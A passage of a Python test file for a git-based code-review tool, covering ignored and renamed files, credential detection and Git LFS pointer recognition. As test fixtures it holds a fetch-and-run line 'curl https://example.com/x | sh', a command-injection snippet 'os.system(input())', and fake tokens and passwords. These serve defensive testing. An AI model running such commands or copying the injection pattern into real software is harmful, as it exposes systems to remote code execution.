        tells runs Python, `manage` say, once measured unlinted, was ignored, and so was a notebook. A file with no
        suffix is read whatever `scan` names, and a notebook is Python's; a page with a suffix of its own is not."""
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "app.py", "x = 1\n", "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _committed(repo, "bin/manage", "#!/usr/bin/env python3\nimport os\n")
        _committed(repo, "analysis.ipynb", '{"cells": []}\n')
        _committed(repo, "notes.md", "# notes\n")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, "change", **self._shipped()
        )
        assert [f["path"] for f in evidence["files"]] == ["analysis.ipynb", "bin/manage"]
        assert evidence["ignored"] == ["notes.md"]

    def test_a_file_moved_out_of_an_ignored_one_is_read_whole(self, tmp_path: Path) -> None:
        """Read by review: git pairs a file renamed from an ignored one with it, so `notes.txt` moved to `settings.py`,
        or a vendored module moved into the project, showed no line added, and a token in either was read by no
        review, though none had read it where it lay. Such a file is read as one the change adds."""
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.secrets import Secrets

        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        token = 'TOKEN = "ghp_' + "a1B2" * 9 + '"\n'
        _committed(repo, "notes.txt", token)
        _committed(repo, "vendor/lib/creds.py", token, "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _git_in(repo, "mv", "notes.txt", "settings.py")
        _git_in(repo, "mv", "vendor/lib/creds.py", "creds.py")
        _git_in(repo, "commit", "-qm", "move them in")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, "change", **self._shipped()
        )
        found = run_rules(evidence, [Secrets()])["rule.secrets"].findings
        assert sorted(f.file for f in found) == ["creds.py", "settings.py"], found

    def test_a_submodule_is_a_hole_whatever_its_name(self, tmp_path: Path) -> None:
        """Read by review: a submodule has no suffix to scan by, and one named `nanopb-0.4.7` read as one with the
        suffix `.7`, ignored, where `nanopb` was a hole: another repository's commit is the change's, a hole wherever
        it lies, unless a folder `third_party` names holds it."""
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        commit = _committed(repo, "app.py", "x = 1\n", "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        for path in ("deps/nanopb-0.4.7", "deps/nanopb", "vendor/nanopb-0.4.7"):
            _git_in(repo, "update-index", "--add", "--cacheinfo", f"160000,{commit},{path}")
        _git_in(repo, "commit", "-qm", "submodules")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, "change", **self._shipped()
        )
        assert [f["path"] for f in evidence["files"]] == ["deps/nanopb", "deps/nanopb-0.4.7"]
        assert evidence["ignored"] == ["vendor/nanopb-0.4.7"]

    def test_a_link_to_a_file_the_review_ignores_is_no_hole(self, tmp_path: Path) -> None:
        """Read by review: a link to a file `scan` leaves out, `bin/run` to a shell script, was a hole for the
        guidelines no change could clear, as they are shown no ignored file; the rules still read it through the
        link, which the review reads."""
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "app.py", "x = 1\n", "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _committed(repo, "scripts/run.sh", "#!/bin/sh\necho hi\n")
        _link_staged(repo, "bin/run", "../scripts/run.sh")
        _git_in(repo, "commit", "-qm", "a link")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, "change", guidelines=True, **self._shipped()
        )
        assert [f["path"] for f in evidence["files"]] == ["bin/run"] and evidence["ignored"] == ["scripts/run.sh"]
        assert not evidence["files"][0]["unread"], evidence["files"][0]["unread"]

    def test_the_credential_rules_read_the_projects_own_files_of_every_kind(self, tmp_path: Path) -> None:
        """Asked by the owner: a key leaks from a README or a script as from code. The two credential rules read the
        project's own files `scan` leaves out. No other check reads them, and no guideline sees them. Another
        project's code stays unread. A binary file of another kind is no hole."""
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.lint import Lint
        from adk_review.judge.rules.named_secrets import NamedSecrets
        from adk_review.judge.rules.secrets import Secrets

        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "app.py", "x = 1\n", "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        token = "ghp_" + "a1B2" * 9
        _committed(repo, "README.md", f"Clone with https://x-access-token:{token}@github.com/acme/app\n")
        _committed(repo, "deploy.sh", "DB_PASSWORD=Xk9mQ2vR7t4p\n")
        _committed(repo, "vendor/lib/README.md", f"Clone with https://x-access-token:{token}@github.com/x/y\n")
        _committed(repo, "docs/manual.pdf", b"%PDF\x00\x01" * 32)
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), BASE, "change", **self._shipped()
        )
        found = run_rules(evidence, [Secrets(), NamedSecrets(), Lint()])
        assert [f.file for f in found["rule.secrets"].findings] == ["README.md"], found
        assert [f.file for f in found["rule.named-secrets"].findings] == ["deploy.sh"], found
        assert found["rule.lint"].findings == [] and token not in evidence["diff"], "no other check reads them"
        assert not any(answer.could_not_look for answer in found.values()), "a binary of another kind is no hole"

    def test_a_whole_project_reads_no_third_party_module(self, tmp_path: Path) -> None:
        """Under `--all`, the head's tree: a third-party module is never parsed for the tree rules or the radius, and
        never counted among the project's files."""
        repo = _branch_off_empty(tmp_path / "repo", "change")
        _committed(repo, "app.py", "import six\n")
        _committed(repo, "third_party/six/__init__.py", "x = 1\n")
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(
            str(repo), None, "change", **self._shipped()
        )
        assert [f["path"] for f in evidence["files"]] == ["app.py"]
        assert list(evidence["tree"].parsed) == ["app.py"], list(evidence["tree"].parsed)

    def test_a_change_of_nothing_read_approves_and_lists_it(self, tmp_path: Path, cli, capsys) -> None:
        """A change of only ignored files, a vendored package and a page, ends approved, the report listing them,
        never "no change to review", which would stop the push that sends it."""
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "app.py", "x = 1\n", "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _committed(repo, "vendor/lib/run.py", "import os\nos.system(input())\n")
        _committed(repo, "README.md", "# x\n")
        code = cli.main([str(repo), "--head", "change", "--base", BASE, "--profile", "default-rules"])
        said = capsys.readouterr().out
        assert code == 0 and "## Verdict: APPROVED" in said, said
        ignored = "- ignored      2 file(s), out of scope, but credential rules still read the project's own:"
        assert ignored in said, said


class TestWhatTheBudgetReadsFirst:
    def test_a_file_a_rule_reads_whole_is_read_before_text_none_does(self, tmp_path: Path, monkeypatch) -> None:
        """Read by review: the changed files' texts were read in their paths' order within the 20 MB budget, so a first
        push of 20 MB of JSON fixtures in `data/` spent it before `src/app.py`, which lint could then not read, and
        the push stopped. Python's files, which rules read whole, are read first, the smallest first."""
        git = importlib.import_module("adk_review.collect.git")
        monkeypatch.setattr(git, "MAX_TREE_BYTES", 3_000)
        repo = _branch_off_empty(tmp_path / "repo", "change")
        for n in range(3):  # 990 bytes each: 30 left of the budget, in their paths' order
            _committed(repo, f"data/fixture_{n}.json", '{"x": "' + "a" * 980 + '"}\n')
        app = "x = 1\n# " + "a" * 92 + "\n"
        _committed(repo, "src/app.py", app)
        files = gathered(repo, "change")
        assert files["src/app.py"]["text"] == app, files["src/app.py"]["unread_text"]


class TestWhatALargeFileStoreHides:
    """A file Git LFS stores is committed as a pointer: three lines naming content kept elsewhere, which no rule and no
    guideline here can read."""

    def test_a_pointer_is_named_unread_never_reviewed_as_the_file(self, tmp_path: Path) -> None:
        """Measured by review: a branch tracked `*.py` with LFS and committed `run.py` as a pointer, and the review
        approved what it never read; a pointer outside the skip list is a hole, as a binary is. One the operator's
        skip list names stays its choice."""
        repo = _branch_off_empty(tmp_path / "repo", "change")
        pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:" + "a" * 64 + "\nsize 1048576\n"
        _committed(repo, "run.py", pointer)
        _committed(repo, "assets/model.bin", pointer)
        files = gathered(repo, "change", skip=["assets/*"])
        assert "Git LFS" in files["run.py"]["unread"], files["run.py"]["unread"]
        assert files["assets/model.bin"]["unread"] == "", "the operator's skip list leaves it to the rules"

    def test_a_file_made_a_pointer_is_named_unread_as_one_added_is(self, tmp_path: Path) -> None:
        """Read by review: a file the change turned into a pointer, as `git lfs track` and `git add --renormalize` do,
        shows its old lines removed before the pointer's, and only the first four lines of the hunk were read, all of
        them removed ones: no pointer was named, the rules linted its lines as Python, and the review approved."""
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "tool.py", "".join(f"x{n} = {n}\n" for n in range(6)), "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _committed(repo, "tool.py", POINTER)
        pointer = gathered(repo, "change")["tool.py"]
        assert "Git LFS" in pointer["unread"], pointer["unread"]
        assert (pointer["text"], pointer["unread_text"]) == (None, None), "no text for the rules either"

    def test_a_pointers_lines_are_no_text_for_the_rules(self, tmp_path: Path) -> None:
        """Measured by review: ruff read a pointer committed as `tool.py` as Python, and four major findings of invalid
        syntax stood on its three lines, which are not the file. A pointer gives the rules no text, as a binary does,
        and the report names it under not read."""
        repo = _branch_off_empty(tmp_path / "repo", "change")
        _committed(repo, "tool.py", POINTER)
        pointer = gathered(repo, "change")["tool.py"]
        assert (pointer["text"], pointer["unread_text"]) == (None, None)

    @pytest.mark.parametrize(
        "pointer",
        [
            "version https://hawser.github.com/spec/v1\noid sha256:{oid}\nsize 9\n",
            "version http://git-media.io/v/2\noid sha256:{oid}\nsize 9\n",
            "version https://git-lfs.github.com/spec/v1\r\noid sha256:{oid}\r\nsize 9\r\n",
            "\n  version https://git-lfs.github.com/spec/v1\noid sha256:{oid}\nsize 9\n",
            "version https://git-lfs.github.com/spec/v1\next-0-foo sha256:{oid}\noid sha256:{oid}\nsize 9\n",
        ],
        ids=["hawser", "git-media", "crlf", "blank-first", "extension"],
    )
    def test_every_spelling_git_lfs_reads_as_a_pointer_is_one(self, pointer: str, tmp_path: Path) -> None:
        """Read by review: one spelling of a pointer was known, where Git LFS 3.8.0 also reads the two version lines it
        took before the spec's, CRLF line ends, blank lines and spaces before it and extension lines after it, and
        smudges each into the stored file: a pointer committed as `tool.py` in any of those was linted as Python, its
        lines eight findings of invalid syntax, and a link to one so too, approved. Both are named not read."""
        from adk_review.collect.change import POINTER_UNREAD

        text = pointer.format(oid="a" * 64)
        repo = _branch_off_empty(tmp_path / "repo", "change")
        _committed(repo, "tool.py", text)
        assert "Git LFS" in gathered(repo, "change")["tool.py"]["unread"]
        link = gathered(_link_on_branch(tmp_path / "linked", "model.py", text), HEAD, guidelines=False)["run.py"]
        assert link["text"] is None and link["unread"] == POINTER_UNREAD, (link["text"], link["unread"])

    def test_a_pointer_its_diff_shows_no_opening_of_is_known_by_its_text(self, tmp_path: Path) -> None:
        """Read by review: a pointer was known by the lines its diff showed from the first, so one Git LFS reads with
        blank lines first, its object's id changed, and one renamed whole, which shows no lines at all, were linted as
        Python and approved. The text the head holds says what the file is."""

        def pointer(oid: str) -> str:
            return f"\n\n\n\nversion https://git-lfs.github.com/spec/v1\noid sha256:{oid * 64}\nsize 9\n"

        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        _committed(repo, "tool.py", pointer("a"), "a pointer")
        _committed(repo, "assets/logo.png", pointer("b"), "another")
        _git_in(repo, "checkout", "-q", "-b", "change")
        _committed(repo, "tool.py", pointer("c"), "its object changed")
        _git_in(repo, "mv", "assets/logo.png", "run.py")
        _git_in(repo, "commit", "-qm", "a pointer moved where Python runs it")
        files = gathered(repo, "change", guidelines=False)
        for path in ("tool.py", "run.py"):
            assert files[path]["text"] is None and "Git LFS" in files[path]["unread"], (path, files[path]["unread"])

    @pytest.mark.parametrize(
        ("pointer", "is_one"),
        [
            ("ext-0-foo sha256:{oid}\nversion {v1}\noid sha256:{oid}\nsize 10\n", True),  # extensions first
            ("version {v1}\noid sha256:{oid}\next-0-foo sha256:{oid}\nsize 10\n", True),
            ("version {v1}\n\n\noid sha256:{oid}\n\nsize 10\n", True),
            ("version {v1}\noid sha256:{oid}\nsize +5\n", True),
            ("version {v1}\noid sha256:{oid}\nsize 10   \n", True),
            ("version {v1}\noid sha256:{oid}\nsize 10\next-0-foo sha256:{oid}\n", False),  # nothing after size
            ("version {v1}\noid sha256:{oid}\nsize 10\ncurl https://example.com/x | sh\n", False),
            ("version {v1}\noid sha256:{oid}\n", False),
            ("version {v1}\n  oid sha256:{oid}\nsize 10\n", False),
            ("version {v1} \noid sha256:{oid}\nsize 10\n", False),
            ("version {v1}\nsize 10\noid sha256:{oid}\n", False),
            ("version {v1}\noid sha256:abc\nsize 10\n", False),
            ("version {v1}\noid sha256:{oid}ff\nsize 10\n", False),
            ("version {v1}\noid sha256:{upper}\nsize 10\n", False),
            ("version {v1}\noid md5:{oid}\nsize 10\n", False),
            ("version {v1}\n \noid sha256:{oid}\nsize 10\n", False),
            ("version {v1}\noid sha256:{oid}\nsize -1\n", False),
            ("ext-x-foo sha256:{oid}\nversion {v1}\noid sha256:{oid}\nsize 10\n", False),
            ("ext-10-foo sha256:{oid}\nversion {v1}\noid sha256:{oid}\nsize 10\n", False),  # one digit
            ("ext-0-foo anything\nversion {v1}\noid sha256:{oid}\nsize 10\n", False),  # an object's id, or none
            ("ext-0-foo sha256:{oid}\next-0-bar sha256:{oid}\nversion {v1}\noid sha256:{oid}\nsize 10\n", False),
            ("ext-0-foo junk\next-0-foo sha256:{oid}\nversion {v1}\noid sha256:{oid}\nsize 10\n", True),  # the last
            ("ext-0-foo sha256:{oid}\next-0-foo junk\nversion {v1}\noid sha256:{oid}\nsize 10\n", False),
            ("ext-0-foo-bar sha256:{oid}\next-1-a!! sha256:{oid}\nversion {v1}\noid sha256:{oid}\nsize 10\n", True),
            ("version {v1}\noid sha256:{oid}\nsize 9223372036854775807\n", True),  # Go's int64
            ("version {v1}\noid sha256:{oid}\nsize 9223372036854775808\n", False),
            ("\x1cversion {v1}\noid sha256:{oid}\nsize 10\n", False),  # what Go reads as no space
            ("version {v1}\noid sha256:{oid}\nsize 10\n\x1f", False),
            ("version {v1}\noid sha256:{oid}\nsize 10\n\u200b", False),
            ("\x85version {v1}\noid sha256:{oid}\nsize 10\n\xa0\u2028", True),  # and what it does
        ],
    )
    def test_a_pointer_is_what_git_lfs_reads_as_one(self, pointer: str, is_one: bool) -> None:
        """Measured with git-lfs 3.8.0's `pointer --check`: the keys in order, extension lines anywhere before the
        size, and nothing after it. Read by review: extension lines first were read as no pointer, the file linted as
        Python and approved; and a pointer with a shell line after its size, which Git LFS checks out as written, was
        named stored elsewhere."""
        from adk_review.collect.change import pointer_text

        oid = "c6f0c6ab4c8c1c8a62d8a9b5e3e0b1d0c4a9e6f5b2d7a8c3e1f0a9b8c7d6e5f4"
        text = pointer.format(v1="https://git-lfs.github.com/spec/v1", oid=oid, upper=oid.upper())
        assert pointer_text(text) is is_one

    @pytest.mark.parametrize("short", [0, 1])
    def test_a_pointer_is_read_over_the_bytes_git_lfs_reads(self, short: int) -> None:
        """Read by review: the window was 1,024 characters where Git LFS reads 1,024 bytes, so a pointer padded with
        ideographic spaces, three bytes each, to the window's end and a line of code after it was read on into the
        code, no pointer, and approved, where Git LFS smudges in the file it stores. Measured with git-lfs 3.8.0."""
        from adk_review.collect.change import POINTER_BYTES, pointer_text

        head = POINTER
        pad = "\u3000" * ((POINTER_BYTES - len(head.encode())) // 3)
        filled = head + pad + " " * (POINTER_BYTES - len((head + pad).encode()) - short)
        assert len(filled.encode()) == POINTER_BYTES - short
        assert pointer_text(filled + "\nimport os\nos.system(input())\n")
        room = POINTER_BYTES - len(head.encode())
        lead = " " if room % 3 == 0 else ""  # so the edge falls inside a three-byte space
        crossing = head + lead + "\u3000" * ((room - len(lead)) // 3 + 1) + "\nimport os\n"
        with pytest.raises(UnicodeDecodeError):
            crossing.encode()[:POINTER_BYTES].decode()
        assert not pointer_text(crossing), (
            "a character the edge cuts is none of Go's spaces, and Git LFS reads no pointer"
        )

    def test_a_pointer_is_read_as_git_lfs_reads_one_over_random_texts(self, tmp_path: Path) -> None:
        """Random texts built of a pointer's pieces, the spaces Go and Python read apart, extension lines, and padding
        up to Git LFS's 1,024 bytes, each asked of git-lfs's `pointer --check` and of `pointer_text`: they agree on
        every one. Two reviews in a row each found a text on which they did not. Each text is asked from a file: Git LFS
        reads a pointer in one read, which a pipe can end at macOS's 512 bytes, and measured on macOS's CI, a pointer
        padded to its edge once read as none."""
        import shutil
        from concurrent.futures import ThreadPoolExecutor

        from adk_review.collect.change import pointer_text

        git = shutil.which("git")
        if git is None or subprocess.run([git, "lfs", "version"], capture_output=True, check=False).returncode:
            pytest.skip("git-lfs is not installed")
        a, b = "a" * 64, "0123456789abcdef" * 4
        pieces = {
            "version": ["version https://git-lfs.github.com/spec/v1", "version https://hawser.github.com/spec/v1"] * 3
            + ["version http://git-media.io/v/2", "version https://example.com/v1", "version  https://x", "version x "],
            "oid": [f"oid sha256:{a}", f"oid sha256:{b}"] * 3 + ["oid sha256:abc", f"oid md5:{a}", f" oid sha256:{a}"],
            "size": ["size 9", "size +5"] * 3 + ["size -1", "size 9223372036854775808", "size x", "size"],
            "ext": [f"ext-0-foo sha256:{a}", f"ext-1-bar sha256:{b}", f"ext-0-baz sha256:{b}", "ext-0-foo junk"],
            "junk": ["", " ", "import os", "\x1c", "\x85", "\xa0", "\u3000", "\u200b", "\r"],
        }
        orders = [["version", "oid", "size"]] * 4 + [
            ["ext", "version", "oid", "size"],
            ["version", "oid", "ext", "size"],
        ]
        orders += [["version", "oid", "size", "ext"], ["version", "oid", "size", "junk"], ["oid", "version", "size"]]
        orders += [["version", "oid"], ["ext", "ext", "version", "oid", "size"], ["junk", "version", "oid", "size"]]
        spaces = ["", "\n", " ", "\u3000", "\xa0", "\x1c", "\r\n", "\x85"]
        rng, texts = random.Random(7), []
        for _ in range(300):
            lines = [rng.choice(pieces[kind]) for kind in rng.choice(orders)]
            text = rng.choice(spaces) + rng.choice(["\n", "\r\n"]).join(lines) + "\n" + rng.choice(spaces)
            if rng.random() < 0.2:  # padded toward Git LFS's 1,024 bytes, or past it, code after them
                pad = rng.choice([" ", "\u3000", "\xa0"])
                count = (1_024 - len(text.encode()) - rng.choice([0, 1, 2])) // len(pad.encode()) + rng.choice(
                    [0, 0, 1]
                )
                text += pad * count + "\nimport os\n"
            texts.append(text)

        def checked(at: int) -> bool:  # from a file: read whole, where a pipe may hand one read the first 512 bytes
            done = subprocess.run([git, "lfs", "pointer", "--check", f"--file={written[at]}"], capture_output=True)
            return done.returncode == 0

        written = [tmp_path / f"{at}.txt" for at in range(len(texts))]
        for path, text in zip(written, texts, strict=True):
            path.write_bytes(text.encode())
        with ThreadPoolExecutor(8) as pool:
            theirs = list(pool.map(checked, range(len(texts))))
        differ = [(text, said) for text, said in zip(texts, theirs, strict=True) if pointer_text(text) is not said]
        assert any(theirs) and not all(theirs), "both kinds asked"
        assert differ == [], differ[:3]

    def test_a_page_quoting_a_pointer_is_read_as_the_page_it_is(self, tmp_path: Path) -> None:
        """A pointer is a whole file, its version line first and the object's id second: a page explaining the format
        holds the same lines further down, and is read as any page."""
        repo = _branch_off_empty(tmp_path / "repo", "change")
        _committed(repo, "docs/lfs.md", "# Pointers\n\nversion https://git-lfs.github.com/spec/v1\noid sha256:abc\n")
        assert gathered(repo, "change")["docs/lfs.md"]["unread"] == ""


class TestTheFunctionAroundEachHunk:
    """What Claude Code's review reads beside each hunk, its enclosing function, the guidelines read too, from git
    itself: a Python hunk widened to the function or class around it, by Python's own boundary."""

    @staticmethod
    def _deep_in_a_method(root: Path) -> Path:
        """`main` holding a class with a short method and a long one, and a twenty-line note; `change` editing a line
        deep in the long method and one in the middle of the note."""
        repo = root / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        steps = "".join(f"        step_{n} = {n}\n" for n in range(10))
        method = f"class Pay:\n    def first(self):\n        return 1\n\n    def total(self, items):\n{steps}"
        _committed(repo, "pay.py", method + "        return step_9\n", "base")
        _committed(repo, "notes.md", "".join(f"line {n}\n" for n in range(20)), "notes")
        _git_in(repo, "checkout", "-q", "-b", "change")
        pay, notes = (repo / "pay.py").read_text(encoding="utf-8"), (repo / "notes.md").read_text(encoding="utf-8")
        _committed(repo, "pay.py", pay.replace("step_8 = 8\n", "step_8 = 80\n"), "deep in total")
        _committed(repo, "notes.md", notes.replace("line 10\n", "line ten\n"), "a note")
        return repo

    def test_a_guideline_reads_a_python_hunk_within_its_function_and_any_other_as_git_prints_it(
        self, tmp_path: Path
    ) -> None:
        """Measured against Claude Code's `/code-review`, whose first angle reads the enclosing function of each hunk:
        git's three lines of context showed an edit deep in a method without its `def`, its arguments or its other
        steps. The method's every line is read, and quotable, the method beside it is not; the note is read as git
        prints a change; and the rules read git's diff and the same added lines either way."""
        repo = self._deep_in_a_method(tmp_path)
        shown, ruled = gathered(repo, "change"), gathered(repo, "change", guidelines=False)
        pay = shown["pay.py"]["diff"]
        assert "\n     def total(self, items):\n" in pay and "\n         step_0 = 0\n" in pay, pay
        assert "\n     def first(self):\n" not in pay, "the method beside it stays out"
        assert any(line == "         step_0 = 0" for hunk in shown["pay.py"]["quotable"] for _at, line in hunk)
        notes = shown["notes.md"]["diff"]
        assert sum(line.startswith(" ") for line in notes.splitlines()) == 6, notes
        assert "\n     def total(self, items):\n" not in ruled["pay.py"]["diff"], "the rules read git's own"
        assert shown["pay.py"]["added"] == ruled["pay.py"]["added"] == [(14, "        step_8 = 80")]

    def test_a_file_its_function_would_push_past_a_cap_is_read_as_git_prints_it(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """Measured over this repository's last 31 commits: widened, the Python diffs were 1.7 times git's, and one
        file of 191, `review.py` with its long `main`, went past the 16,000-character cap, which would have left it
        unread, a hole. A file widening pushes past the diff cap is read as git prints it, and so is every widened
        file where the block, counted as the block counts, would leave a file out: the context never costs a file its
        reading. Measured by review, a total of the raw diffs, framing uncounted, kept the widened files of a change
        that then left one out."""
        change = importlib.import_module("adk_review.collect.change")
        repo = self._deep_in_a_method(tmp_path)
        ruled = gathered(repo, "change", guidelines=False)
        wide, plain = gathered(repo, "change")["pay.py"]["diff"], ruled["pay.py"]["diff"]
        assert len(plain) < len(wide)
        narrowed = gathered(repo, "change", diff_cap=(len(plain) + len(wide)) // 2)["pay.py"]
        assert narrowed["diff"] == plain and narrowed["unread"] == "" and not narrowed["cut"], narrowed["unread"]
        entries = [{"path": path, "status": f["status"]} for path, f in ruled.items()]
        cap = importlib.import_module("adk_review.collect.diff").DIFF_CAP_CHARS
        whole = change.shown_to_guidelines(entries, [f["diff"] for f in ruled.values()], cap, ())[1]
        monkeypatch.setattr(change, "BLOCK_CAP_CHARS", len(whole))  # room for git's own diffs, not for the widened
        files = gathered(repo, "change")
        assert files["pay.py"]["diff"] == plain and not any(f["unread"] for f in files.values()), files["pay.py"]

    def test_a_function_widened_past_sixteen_thousand_characters_is_read_as_git_prints_it(self, tmp_path: Path) -> None:
        """Measured by review once the cap rose to 90,000: a one-line edit in a long function sent each guideline the
        function whole, up to that cap, where past 16,000 it had been read as git prints it. The context widening adds
        is held to `WIDEN_CAP_CHARS` whatever the cap; a file's own diff still reads to `diff_cap`."""
        diff = importlib.import_module("adk_review.collect.diff")
        repo = tmp_path / "repo"
        repo.mkdir()
        _git_in(repo, "init", "-q", "-b", BASE)
        steps = "".join(f"        step_{n} = {n}\n" for n in range(1_500))
        _committed(repo, "pay.py", f"class Pay:\n    def total(self, items):\n{steps}        return step_0\n", "base")
        _git_in(repo, "checkout", "-q", "-b", "change")
        text = (repo / "pay.py").read_text(encoding="utf-8")
        _committed(repo, "pay.py", text.replace("step_750 = 750\n", "step_750 = 7500\n"), "deep in total")
        assert diff.WIDEN_CAP_CHARS < len(steps) < diff.DIFF_CAP_CHARS, "a function between the two"
        plain = gathered(repo, "change", guidelines=False)["pay.py"]["diff"]
        shown = gathered(repo, "change")["pay.py"]
        assert shown["diff"] == plain and shown["unread"] == "" and not shown["cut"], len(shown["diff"])

    def test_the_files_read_whole_take_the_block_before_a_file_cut_at_the_cap(self, monkeypatch) -> None:
        """Measured by review once the cap rose to 90,000: the block took the files in path order, so a long file cut
        at the cap, first in that order, took the room of small files read whole after it, and they were left out
        whole; in one of this repository's commits, 2 files were left out where 5 had been cut. The files read whole
        take the room first, then the cut ones, and the block shows them in path order still."""
        change = importlib.import_module("adk_review.collect.change")
        monkeypatch.setattr(change, "BLOCK_CAP_CHARS", 3_000)
        small = "@@ -0,0 +1,20 @@\n" + "".join(f"+v_{n} = {n}\n" for n in range(20))
        long = "@@ -0,0 +1,400 @@\n" + "".join(f"+value_{n} = {n}\n" for n in range(400))
        paths = ["a_long.py", *(f"b_{n}.py" for n in range(6))]
        entries = [{"path": path, "status": "A"} for path in paths]
        files, block, _excluded, left_out = change.shown_to_guidelines(entries, [long] + [small] * 6, 2_000, ())
        assert [bool(f["unread"]) for f in files] == [True] + [False] * 6, [f["unread"] for f in files]
        assert left_out == 1 and block.index("b_0.py") < block.index("b_5.py"), block[-200:]

    def test_a_file_the_skip_list_leaves_out_never_costs_the_rest_their_function(self, tmp_path: Path) -> None:
        """Measured by review: a dependency bump's lockfile, 481,156 of a change's 527,509 characters and on the
        operator's skip list, read every Python file of it as git prints it where the block held 46,105, and this
        repository's own 38-file range, 274,798 characters in all, lost the context of its 29 Python files where the
        widened block held every file in 247,179. What the guidelines are shown decides, as the block counts it."""
        repo = self._deep_in_a_method(tmp_path)
        _committed(repo, "uv.lock", "x" * 300_000 + "\n", "a lock")
        files = gathered(repo, "change", skip=["*.lock"])
        assert "\n     def total(self, items):\n" in files["pay.py"]["diff"], "still read within its function"
        assert files["uv.lock"]["unread"] == "" and not any(f["unread"] for f in files.values())


class TestWhatTheGuidelinesAreShown:
    """The block the guidelines read, decided from the diffs alone: no repository, no git."""

    @staticmethod
    def _diff(path: str, *added: str) -> str:
        body = "".join(f"+{line}\n" for line in added)
        return f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n@@ -0,0 +1,{len(added)} @@\n{body}"

    def test_each_file_is_shown_until_the_block_is_full_and_the_rest_named(self, monkeypatch) -> None:
        from adk_review.collect import change, diff

        entries = [{"path": p, "status": "A"} for p in ("a.py", "b.py", "logo.png")]
        diffs = [self._diff("a.py", "x = 1"), self._diff("b.py", "y = 2"), self._diff("logo.png", "binary")]
        first, _ = diff.framed("a.py", diffs[0])
        monkeypatch.setattr(change, "BLOCK_CAP_CHARS", len(first))  # room for `a.py` alone
        files, block, excluded, left_out = change.shown_to_guidelines(entries, diffs, diff.DIFF_CAP_CHARS, ["*.png"])
        shown, past, skipped = files
        assert shown["quotable"] and not shown["cut"] and shown["unread"] == "", shown
        assert past["quotable"] == [] and past["cut"] and past["unread"].startswith("past the"), past
        assert skipped["unread"] == "" and not skipped["cut"] and excluded == {"logo.png": "*.png"}, skipped
        assert block.startswith(first) and "b.py" not in block.split("\n\n[…")[0], block
        assert "[… 1 more file(s) not shown: past" in block and "the operator's skip list leaves them out" in block
        assert left_out == 1, "how many the block's cap left out, which the collector reads"
        assert [sorted(f["added_at"]) for f in files] == [[1], [1], [1]], "every file's added lines, shown or not"

    def test_with_no_guideline_no_file_is_capped_or_shown_and_what_no_one_reads_is_still_named(self) -> None:
        """Measured: the view cost 2.3 s of a 10.5 s `default-rules` review of 2,683 files, the pre-push hook's
        profile, and nothing read it. The rules read every added line, so only what no one can read is named."""
        from adk_review.collect import change

        binary = "diff --git a/logo.png b/logo.png\nBinary files /dev/null and b/logo.png differ\n"
        entries = [{"path": p, "status": "A"} for p in ("a.py", "logo.png", "vendor.png")]
        diffs = [self._diff("a.py", "x" * 50), binary, binary]
        files, block, excluded, left_out = change.shown_to_guidelines(entries, diffs, 10, ["vendor*"], shown=False)
        code, image, _vendor = files
        assert code["quotable"] == [] and not code["cut"] and code["unread"] == "", "past the cap, cut for no one"
        assert image["unread"].startswith("binary"), "what no one can read is still named"
        assert excluded == {"vendor.png": "vendor*"} and "### " not in block and left_out == 0, block
        assert [sorted(f["added_at"]) for f in files] == [[1], [], []], "every file's added lines, for the rules"


def test_the_intakes_tools_run_git_off_the_loop(demo_repo: Path) -> None:
    """ADK awaits an async tool but calls a sync one inline on the event loop unless a thread pool is configured,
    which `adk web` never does, so git ran on the one loop that serves every session: each tool is a coroutine, and
    its git runs in a thread."""
    import asyncio
    import inspect

    from adk_review.judge import tools as model_tools

    context = tool_context()
    assert inspect.iscoroutinefunction(model_tools.inspect_repository)
    assert inspect.iscoroutinefunction(model_tools.changed_files)
    assert asyncio.run(model_tools.inspect_repository(str(demo_repo), BASE, HEAD, context))["status"] == "success"
    assert asyncio.run(model_tools.changed_files(context))["count"] == 4
